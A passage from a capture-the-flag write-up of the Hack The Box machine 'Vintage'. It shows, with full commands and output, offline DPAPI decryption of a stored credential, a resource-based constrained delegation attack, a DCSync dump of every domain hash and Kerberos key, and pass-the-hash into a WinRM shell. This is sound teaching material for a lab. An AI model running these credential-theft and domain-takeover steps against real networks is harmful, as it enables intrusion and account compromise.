+ .\RunasCs.exe -l 2 -d vintage.htb c.neri Zer0the0ne "cmdkey /l"
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~.
At line:1 char:1                                                                               
+ .\RunasCs.exe -l 2 -d vintage.htb c.neri Zer0the0ne "cmdkey /l"
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed

```

Defender eats the binary. I could go into AV evasion from here, and then run a script like [Invoke-WCMDump](https://github.com/peewpw/Invoke-WCMDump), but it’s much easier to just take the encrypted secret and key offline and decrypt there.

#### Via Offline Decryption

I’ll need the master key, information about the account, and the encrypted credential. The master key is helped in `AppData\Roaming\Microsoft\Protect\[sid]`:

```
*Evil-WinRM* PS C:\users\c.neri\appdata\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115> ls -force

    Directory: C:\users\c.neri\appdata\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          6/7/2024   1:17 PM            740 4dbf04d8-529b-4b4c-b4ae-8e875e4fe847
-a-hs-          6/7/2024   1:17 PM            740 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
-a-hs-          6/7/2024   1:17 PM            904 BK-VINTAGE
-a-hs-          6/7/2024   1:17 PM             24 Preferred

```

There’s two files there that could be the master key. Trying to download either with Evil-WinRM fails:

```
*Evil-WinRM* PS C:\users\c.neri\appdata\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115> download 4dbf04d8-529b-4b4c-b4ae-8e875e4fe847
                                        
Info: Downloading C:\users\c.neri\appdata\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115\4dbf04d8-529b-4b4c-b4ae-8e875e4fe847 to 4dbf04d8-529b-4b4c-b4ae-8e875e4fe847

Error: Download failed. Check filenames or paths: uninitialized constant WinRM::FS::FileManager::EstandardError
*Evil-WinRM* PS C:\users\c.neri\appdata\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115> download 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b

Info: Downloading C:\users\c.neri\appdata\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115\99cf41a3-a552-4cf7-a8d7-aca2d6f7339b to 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
                                        
Error: Download failed. Check filenames or paths: uninitialized constant WinRM::FS::FileManager::EstandardError

```

I’ll just base64-encode them:

```
*Evil-WinRM* PS C:\> [Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\users\c.neri\appdata\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115\4dbf04d8-529b-4b4c-b4ae-8e875e4fe847'))
AgAAAAAAAAAAAAAANABkAGIAZgAwADQAZAA4AC0ANQAyADkAYgAtADQAYgA0AGMALQBiADQAYQBlAC0AOABlADgANwA1AGUANABmAGUAOAA0ADcAAAAAAAAAAAAAAAAAiAAAAAAAAABoAAAAAAAAAAAAAAAAAAAAdAEAAAAAAAACAAAA2or8mZsV0QcGzC0XUJ9K8FBGAAAJgAAAA2YAAJhSpSk/CQYorLpjFuO6lxoHg+a9CGghh0pqkMYfO5Irop3dQGYbS2b3KJo0qLO586XfAvV/0dK/fM8a4erXENVlgtsrHRG48O/VO0Egw0qMZld65hY3jxMWTkzfGqfjNK5ytEtwPHGkAgAAAFiAHjGrO47Qhcn7oxZZBrBQRgAACYAAAANmAABRlZY9IPg0gA9TOU3DaFwm1ylSDyf2HHVE2mTqFzwbK7ZHp2XH8Mx2rvk6EpPUtdIv4kkQU6GsO43Xyg+qcks13CkP8uIIo0ECAAAAAAEAAFgAAACn2p9w/uXURbRTVVUG8NTwGUQAxdTpQrS3sEc8gVH9tmXllgaPOCz8cyowsRu8fkbCLFyIcsLVGKHQRv3PUJ1qmSeC604xcQlXI43XddWfFZ3tFF1yLQOSNwfbKDdGQiF3yTlYb6KoMvhQXzs1O1LLP2cUEFOGw8+Pg8uMN4KDBURRWfqmRksyn38bg3OKFSQ1K0CpdNzKfPvS6TnGuvHvnglzZdT5qwQ+nOdXFuJccenatjtlVgQNdp6yZOmpQjrkTtZOxz9b0JRsoOQS0NWu7WThQU4s8yeZkHaJRSJ5lohgdYpZiLJ4x1lG5jLz7/IX5pP6UK1cq5KwLjvaMdGsK9GDj3ofoB/OldTS7StCAXHfzvgjmTscAdxSARKV8ekuDWjsXgz7iZkV04lUG5Jo2FD9xrFdY1DqTSbr7oLdHAwzFBQX5RGnDhKFJXA0KJ29sz1zHGVn4/J4k0e/Hkop6YwRfEighbU=
*Evil-WinRM* PS C:\> [Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\users\c.neri\appdata\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115\99cf41a3-a552-4cf7-a8d7-aca2d6f7339b'))
AgAAAAAAAAAAAAAAOQA5AGMAZgA0ADEAYQAzAC0AYQA1ADUAMgAtADQAYwBmADcALQBhADgAZAA3AC0AYQBjAGEAMgBkADYAZgA3ADMAMwA5AGIAAAAAAAAAAAAAAAAAiAAAAAAAAABoAAAAAAAAAAAAAAAAAAAAdAEAAAAAAAACAAAA6o788ZIMNhaSpbkSX0mC01BGAAAJgAAAA2YAABAM9ZX6Z/40RYL/aC+dw/D5oa7WMYBN56zwgXYX4QrAIb4DtJoM27zWgMxygJ36SpSHHHQGJMgTs6nZN5U/1q7DBIpQlsWk15jpmUFS2czCScuP9C+dGdYT+p6AWb3L7PZUPqNDHqZRAgAAALFxHXdcOeYbfN6CsYeVaYZQRgAACYAAAANmAABiEtEJeAVpg4QA0lnUzAsf6koPtccl1os9yZrj1gTAc/oSmhBNPEE3/VVVPZw9g3NP26Wj3vO36IOmtsXWYABkukmijrSaAZUCAAAAAAEAAFgAAACn2p9w/uXURbRTVVUG8NTwr2BFf0a0DhdM8JymBww6mzQt8tVsTbDmCZ/uZu3bzOAOUXODaGaJOOKqRm2W8rHPOZ27YjtD1pd0MFJDocNJwdhN5pwTdz2v2JsrVVVE363zZjXHeXefhuL5AMwMQr6gpTsCGcxrd1ziTN9Q1lH9QtnYE7OZlbrZPhiWO2vvdX+UQcKlgpxcSGLaczL53/UJXrvt9hueRn+YXxnK+fiyZ0gmjMlP+yuxOiKSvHM/UT6NmuYewnApQrOBO3A5F1XKHguHKT+VS187uBu/TO1ZT4/CrsKws1aG7EkIXhRKzEgukAwn5nZlU6YaADdeQRDzCR1D0ycJKFyZd4QE1Nt6Kbgr+ukbiurwBJd/D1a3+WWCw+S2OJVHB9qqlcW11heJd+v9eGe1Wf6/PYCvyyWMsvusF8XUswgKQbkH821vscyNmJWDwMply/ZvellKuGQ1/s5gVqUkALQ=

```

I’ll do the same with the credential file:

```
*Evil-WinRM* PS C:\> [Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\users\c.neri\appdata\roaming\microsoft\credentials\C4BB96844A5C9DD45D5B6A9859252BA6'))     
AQAAAKIBAAAAAAAAAQAAANCMnd8BFdERjHoAwE/Cl+sBAAAAo0HPmVKl90yo16yi1vczmwAAACA6AAAARQBuAHQAZQByAHAAcgBpAHMAZQAgAEMAcgBlAGQAZQBuAHQAaQBhAGwAIABEAGEAdABhAA0ACgAAAANmAADAAAAAEAAAANlsnh9uZhRwM1xc/8CNBwwAAAAABIAAAKAAAAAQAAAAK+zRTF7v+bPA1UScG2CL4uAAAABoyaUl8s/1J1TabkeZkP1VvjzlbcQ61ojdLQpks7Q0/irEKMmlFOJ/Za2o8akFz3kS28HEeNGkg/3kGNOvhVbnZ2NJQHTJ12SgjFuAuPhdS9Ob2CvqW9xu7pDGXPt5AHKqlqRy+fajjcEYkGP0ki6sLBF/rpFnQvRQ9hCg8iVqyq3BpSdwOZ1h0Zxh8mbvDPv+XHw9+o6DabZifdfj+GuMRi+GDNLvv8orYUqHZ6hHO3vB4kDu5T4G8QsIAtULBs3V2ww1G7xdGI57BGKi4LEk6kuaEWopsCflsc5FK4a4xBQAAABSjIrXKMIH3qbzDSrnPMUzCyhkAA==

```

For each of these three, I’ll paste the base64, decode it, and save it as a file on my host.

Now I’ll use the [Impacket](https://github.com/SecureAuthCorp/impacket) `dpapi.py` script (installed with `uv tool install impacket`, see [here](https://www.youtube.com/watch?v=G36QXtBXKBQ) for Python tool installations) to first decrypt the master key:

```

oxdf@hacky$ dpapi.py masterkey -file 4dbf04d8-529b-4b4c-b4ae-8e875e4fe847 -sid S-1-5-21-4024337825-2033394866-2055507597-1115 -password Zer0the0ne
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 4dbf04d8-529b-4b4c-b4ae-8e875e4fe847
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0x55d51b40d9aa74e8cdc44a6d24a25c96451449229739a1c9dd2bb50048b60a652b5330ff2635a511210209b28f81c3efe16b5aee3d84b5a1be3477a62e25989f

```

I’ll use that key to try to decrypt the credential, but it doesn’t work:

```

oxdf@hacky$ dpapi.py credential -file C4BB96844A5C9DD45D5B6A9859252BA6 -key 0x55d51b40d9aa74e8cdc44a6d24a25c96451449229739a1c9dd2bb50048b60a652b5330ff2635a511210209b28f81c3efe16b5aee3d84b5a1be3477a62e25989f
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

ERROR: Padding is incorrect.

```

I’ll try the other master key, and it works:

```

oxdf@hacky$ dpapi.py masterkey -file 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b -sid S-1-5-21-4024337825-2033394866-2055507597-1115 -password Zer0the0ne
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a
oxdf@hacky$ dpapi.py credential -file C4BB96844A5C9DD45D5B6A9859252BA6 -key 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2024-06-07 15:08:23
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000001 (CRED_TYPE_GENERIC)
Target      : LegacyGeneric:target=admin_acc
Description : 
Unknown     : 
Username    : vintage\c.neri_adm
Unknown     : Uncr4ck4bl3P4ssW0rd0312

```

There’s the password for c.neri\_adm. It works:

```

oxdf@hacky$ netexec smb dc01.vintage.htb -u c.neri_adm -p 'Uncr4ck4bl3P4ssW0rd0312' -k
SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\c.neri_adm:Uncr4ck4bl3P4ssW0rd0312 

```

## Shell as L.Bianchi\_adm

### Enumeration

In Bloodhound, I’ll mark C.Neri\_adm as owned, and do pre-defined search “Shortest paths from Owned objects to Tier Zero” (I’ll have to uncomment the query) or even “Shortest paths from Owned objects”. Either one will show this relationship:

![image-20250421085218854](/img/image-20250421085218854.png)

Switching to Pathfinding from C.Neri\_adm to DC01 shows the full privileges:

![image-20250421090816390](/img/image-20250421090816390.png)

### RBCD Delegation

#### Strategy

The `AllowedToAct` attribute is given when the group is configured for resource based constrained delegation (RBCD). I’ve covered this before in [Freelancer](/2024/10/05/htb-freelancer.html#exploit-via-rbcd) and [Rebound](/2024/03/30/htb-rebound.html#resource-based-constrained-delegation).

To pull of this attack, I’ll need a compromised account with a service principal name (SPN). C.Neri\_adm does not have one, and I don’t have permissions to add one. But, FS01$ does, and C.Neri\_adm has `GenericWrite` over DelegatedAdmins, which means they can add accounts to the group. From there, I can have the FS01$ account request a ticket on behalf of any account. There are many ways to exploit this. I’ll get a CIFS ticket as the DC01$ computer account and use that to dump the hashes for the domain.

#### Add FS01$ to DelegatedAdmins

I’ll use `bloodyAD` to add the account to the group. I’ll need a Kerberos ticket as C.Neri\_adm:

```

oxdf@hacky$ kinit c.neri_adm
Password for c.neri_adm@VINTAGE.HTB:
oxdf@hacky$ klist
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: c.neri_adm@VINTAGE.HTB                        

Valid starting       Expires              Service principal
04/21/2025 13:06:00  04/21/2025 23:06:00  krbtgt/VINTAGE.HTB@VINTAGE.HTB
        renew until 04/22/2025 13:05:55    

```

`bloodyAD` has a `add groupMember` command:

```

oxdf@hacky$ KRB5CCNAME=/tmp/krb5cc_1000 bloodyAD -d vintage.htb -k --host dc01.vintage.htb -k add groupMember DelegatedAdmins 'fs01$'
[+] fs01$ added to DelegatedAdmins

```

#### Get DC01$ ST

I’ll make a new ticket as FS01$:

```

oxdf@hacky$ kinit fs01$
Password for fs01$@VINTAGE.HTB: 
oxdf@hacky$ klist
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: fs01$@VINTAGE.HTB

Valid starting       Expires              Service principal
04/21/2025 13:32:33  04/21/2025 23:32:33  krbtgt/VINTAGE.HTB@VINTAGE.HTB
        renew until 04/22/2025 13:32:30

```

With this ticket, I’ll use `getST.py` (from [Impacket](https://github.com/SecureAuthCorp/impacket)) to get a ticket as DC01$:

```

oxdf@hacky$ getST.py -spn 'cifs/dc01.vintage.htb' -impersonate 'dc01$' 'vintage.htb/fs01$:fs01' -dc-ip dc01.vintage.htb
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating dc01$
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in dc01$@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache

```

It works:

```

oxdf@hacky$ KRB5CCNAME=dc01\$@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache netexec smb dc01.vintage.htb -k --use-kcache 
SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\dc01$ from ccache

```

#### DCSync

From here I can do a DCSync attack to get hashes for the domain. For example, I can grab the administrator hash with `netexec`:

```

oxdf@hacky$ KRB5CCNAME=dc01\$@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache netexec smb dc01.vintage.htb -k --use-kcache --ntds --user administrator
SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\dc01$ from ccache 
SMB         dc01.vintage.htb 445    dc01             [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
SMB         dc01.vintage.htb 445    dc01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         dc01.vintage.htb 445    dc01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:468c7497513f8243b59980f2240a10de:::
SMB         dc01.vintage.htb 445    dc01             [+] Dumped 1 NTDS hashes to /home/oxdf/.nxc/logs/ntds/dc01_dc01.vintage.htb_2025-04-21_135611.ntds of which 1 were added to the database
SMB         dc01.vintage.htb 445    dc01             [*] To extract only enabled accounts from the output file, run the following command: 
SMB         dc01.vintage.htb 445    dc01             [*] cat /home/oxdf/.nxc/logs/ntds/dc01_dc01.vintage.htb_2025-04-21_135611.ntds | grep -iv disabled | cut -d ':' -f1
SMB         dc01.vintage.htb 445    dc01             [*] grep -iv disabled /home/oxdf/.nxc/logs/ntds/dc01_dc01.vintage.htb_2025-04-21_135611.ntds | cut -d ':' -f1

```

Or dump everything with `secretsdump`:

```

oxdf@hacky$ KRB5CCNAME=dc01\$@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache secretsdump.py 'vintage.htb/dc01$@dc01.vintage.htb' -dc-ip dc01.vintage.htb -k -no-pass
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:468c7497513f8243b59980f2240a10de:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:be3d376d906753c7373b15ac460724d8:::
M.Rossi:1111:aad3b435b51404eeaad3b435b51404ee:8e5fc7685b7ae019a516c2515bbd310d:::
R.Verdi:1112:aad3b435b51404eeaad3b435b51404ee:42232fb11274c292ed84dcbcc200db57:::
L.Bianchi:1113:aad3b435b51404eeaad3b435b51404ee:de9f0e05b3eaa440b2842b8fe3449545:::
G.Viola:1114:aad3b435b51404eeaad3b435b51404ee:1d1c5d252941e889d2f3afdd7e0b53bf:::
C.Neri:1115:aad3b435b51404eeaad3b435b51404ee:cc5156663cd522d5fa1931f6684af639:::
P.Rosa:1116:aad3b435b51404eeaad3b435b51404ee:8c241d5fe65f801b408c96776b38fba2:::
svc_sql:1134:aad3b435b51404eeaad3b435b51404ee:cc5156663cd522d5fa1931f6684af639:::
svc_ldap:1135:aad3b435b51404eeaad3b435b51404ee:458fd9b330df2eff17c42198627169aa:::
svc_ark:1136:aad3b435b51404eeaad3b435b51404ee:1d1c5d252941e889d2f3afdd7e0b53bf:::
C.Neri_adm:1140:aad3b435b51404eeaad3b435b51404ee:91c4418311c6e34bd2e9a3bda5e96594:::
L.Bianchi_adm:1141:aad3b435b51404eeaad3b435b51404ee:6b751449807e0d73065b0423b64687f0:::
DC01$:1002:aad3b435b51404eeaad3b435b51404ee:2dc5282ca43835331648e7e0bd41f2d5:::
gMSA01$:1107:aad3b435b51404eeaad3b435b51404ee:587368d45a7559a1678b842c5c829fb3:::
FS01$:1108:aad3b435b51404eeaad3b435b51404ee:44a59c02ec44a90366ad1d0f8a781274:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:5f22c4cf44bc5277d90b8e281b9ba3735636bd95a72f3870ae3de93513ce63c5
Administrator:aes128-cts-hmac-sha1-96:c119630313138df8cd2e98b5e2d018f7
Administrator:des-cbc-md5:c4d5072368c27fba
krbtgt:aes256-cts-hmac-sha1-96:8d969dafdd00d594adfc782f13ababebbada96751ec4096bce85e122912ce1f0
krbtgt:aes128-cts-hmac-sha1-96:3c7375304a46526c00b9a7c341699bc0
krbtgt:des-cbc-md5:e923e308752658df
M.Rossi:aes256-cts-hmac-sha1-96:14d4ea3f6cd908d23889e816cd8afa85aa6f398091aa1ab0d5cd1710e48637e6
M.Rossi:aes128-cts-hmac-sha1-96:3f974cd6254cb7808040db9e57f7e8b4
M.Rossi:des-cbc-md5:7f2c7c982cd64361
R.Verdi:aes256-cts-hmac-sha1-96:c3e84a0d7b3234160e092f168ae2a19366465d0a4eab1e38065e79b99582ea31
R.Verdi:aes128-cts-hmac-sha1-96:d146fa335a9a7d2199f0dd969c0603fb
R.Verdi:des-cbc-md5:34464a58618f8938
L.Bianchi:aes256-cts-hmac-sha1-96:abcbbd86203a64f177288ed73737db05718cead35edebd26740147bd73e9cfed
L.Bianchi:aes128-cts-hmac-sha1-96:92067d46b54cdb11b4e9a7e650beb122
L.Bianchi:des-cbc-md5:01f2d667a19bce25
G.Viola:aes256-cts-hmac-sha1-96:f3b3398a6cae16ec640018a13a1e70fc38929cfe4f930e03b1c6f1081901844a
G.Viola:aes128-cts-hmac-sha1-96:367a8af99390ebd9f05067ea4da6a73b
G.Viola:des-cbc-md5:7f19b9cde5dce367
C.Neri:aes256-cts-hmac-sha1-96:c8b4d30ca7a9541bdbeeba0079f3a9383b127c8abf938de10d33d3d7c3b0fd06
C.Neri:aes128-cts-hmac-sha1-96:0f922f4956476de10f59561106aba118
C.Neri:des-cbc-md5:9da708a462b9732f
P.Rosa:aes256-cts-hmac-sha1-96:f9c16db419c9d4cb6ec6242484a522f55fc891d2ff943fc70c156a1fab1ebdb1
P.Rosa:aes128-cts-hmac-sha1-96:1cdedaa6c2d42fe2771f8f3f1a1e250a
P.Rosa:des-cbc-md5:a423fe64579dae73
svc_sql:aes256-cts-hmac-sha1-96:3bc255d2549199bbed7d8e670f63ee395cf3429b8080e8067eeea0b6fc9941ae
svc_sql:aes128-cts-hmac-sha1-96:bf4c77d9591294b218b8280c7235c684
svc_sql:des-cbc-md5:2ff4022a68a7834a
svc_ldap:aes256-cts-hmac-sha1-96:d5cb431d39efdda93b6dbcf9ce2dfeffb27bd15d60ebf0d21cd55daac4a374f2
svc_ldap:aes128-cts-hmac-sha1-96:cfc747dd455186dba6a67a2a340236ad
svc_ldap:des-cbc-md5:e3c48675a4671c04
svc_ark:aes256-cts-hmac-sha1-96:820c3471b64d94598ca48223f4a2ebc2491c0842a84fe964a07e4ee29f63d181
svc_ark:aes128-cts-hmac-sha1-96:55aec332255b6da8c1344357457ee717
svc_ark:des-cbc-md5:6e2c9b15bcec6e25
C.Neri_adm:aes256-cts-hmac-sha1-96:96072929a1b054f5616e3e0d0edb6abf426b4a471cce18809b65559598d722ff
C.Neri_adm:aes128-cts-hmac-sha1-96:ed3b9d69e24d84af130bdc133e517af0
C.Neri_adm:des-cbc-md5:5d6e9dd675042fa7
L.Bianchi_adm:aes256-cts-hmac-sha1-96:529fa80540d759052c6beb161d5982435a37811b3ad2a338e81b75797c11959e
L.Bianchi_adm:aes128-cts-hmac-sha1-96:7e4599a7f84c2868e20141bdc8608bd7
L.Bianchi_adm:des-cbc-md5:8fa746971a98fedf
DC01$:aes256-cts-hmac-sha1-96:f8ceb2e0ea58bf929e6473df75802ec8efcca13135edb999fcad20430dc06d4b
DC01$:aes128-cts-hmac-sha1-96:a8f037cb02f93e9b779a84441be1606a
DC01$:des-cbc-md5:c4f15ef8c4f43134
gMSA01$:aes256-cts-hmac-sha1-96:a46cac126e723b4ae68d66001ab9135ef30aa4b7c0eb1ca1663495e15fe05e75
gMSA01$:aes128-cts-hmac-sha1-96:6d8f13cee54c56bf541cfc162e8a22ef
gMSA01$:des-cbc-md5:a70d6b43e64a2580
FS01$:aes256-cts-hmac-sha1-96:d57d94936002c8725eab5488773cf2bae32328e1ba7ffcfa15b81d4efab4bb02
FS01$:aes128-cts-hmac-sha1-96:ddf2a2dcc7a6080ea3aafbdf277f4958
FS01$:des-cbc-md5:dafb3738389e205b
[*] Cleaning up...

```

### Shell

#### Administrator Fails

The next step would be to take the NTLM hash for administrator, request a TGT, and use it to get WinRM access:

```

oxdf@hacky$ getTGT.py vintage.htb/administrator@dc01.vintage.htb -hashes :468c7497513f8243b59980f2240a10de                          
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in administrator@dc01.vintage.htb.ccache
oxdf@hacky$ KRB5CCNAME=administrator@dc01.vintage.htb.ccache evil-winrm -i dc01.vintage.htb -r vintage.htb

Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint

Error: An error of type GSSAPI::GssApiError happened, message is gss_init_sec_context did not return GSS_S_COMPLETE: Invalid token was supplied
Success

Error: Exiting with code 1

```

It fails. That’s because the Administrator account is restricted from logging in. I can see this with `netexec`:

```

oxdf@hacky$ netexec smb dc01.vintage.htb -u Administrator -H 468c7497513f8243b59980f2240a10de -k
SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\Administrator:468c7497513f8243b59980f2240a10de STATUS_LOGON_TYPE_NOT_GRANTED 

```

`STATUS_LOGON_TYPE_NOT_GRANTED` says that this user cannot log on, at least in this way.

#### L.Bianchi\_adm

The Domain Admins group has two users in it:

![image-20250421100638146](/img/image-20250421100638146.png)

I’ll try the same thing with L.Bianchi\_adm:

```

oxdf@hacky$ getTGT.py vintage.htb/L.Bianchi_adm@dc01.vintage.htb -hashes :6b751449807e0d73065b0423b64687f0
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in L.Bianchi_adm@dc01.vintage.htb.ccache
oxdf@hacky$ KRB5CCNAME=L.Bianchi_adm@dc01.vintage.htb.ccache evil-winrm -i dc01.vintage.htb -r vintage.htb
                                        
Evil-WinRM shell v3.7
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\L.Bianchi_adm\Documents>

```

It works, and I have a shell. I could have skipped the DCSync attack and just gotten a ticket as L.Bianchi\_adm from the RBCD attack as well.

I’ll read `root.txt`:

```
*Evil-WinRM* PS C:\Users\administrator\desktop> type root.txt
c5cdaf4c************************

```